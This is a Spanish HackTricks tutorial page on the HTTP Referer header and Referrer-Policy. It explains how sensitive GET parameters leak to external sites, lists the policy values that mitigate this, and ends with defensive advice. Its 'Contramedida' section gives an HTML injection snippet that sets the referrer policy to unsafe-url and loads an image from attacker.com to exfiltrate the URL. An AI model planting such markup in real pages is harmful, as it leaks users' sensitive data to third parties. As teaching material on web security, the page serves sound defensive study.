{% hint style="success" %}
Aprende y practica AWS Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Entrenamiento de HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Entrenamiento de HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}


# Encabezados de Referente y política

Referente es el encabezado utilizado por los navegadores para indicar cuál fue la página anterior visitada.

## Información sensible filtrada

Si en algún momento dentro de una página web se encuentra información sensible en los parámetros de una solicitud GET, si la página contiene enlaces a fuentes externas o un atacante es capaz de hacer/sugerir (ingeniería social) que el usuario visite una URL controlada por el atacante. Podría ser capaz de extraer la información sensible dentro de la última solicitud GET.

## Mitigación

Puedes hacer que el navegador siga una **política de Referente** que podría **evitar** que la información sensible se envíe a otras aplicaciones web:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Contramedida

Puedes anular esta regla utilizando una etiqueta meta de HTML (el atacante necesita explotar una inyección de HTML):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Defensa

Nunca coloque datos sensibles dentro de los parámetros GET o rutas en la URL.
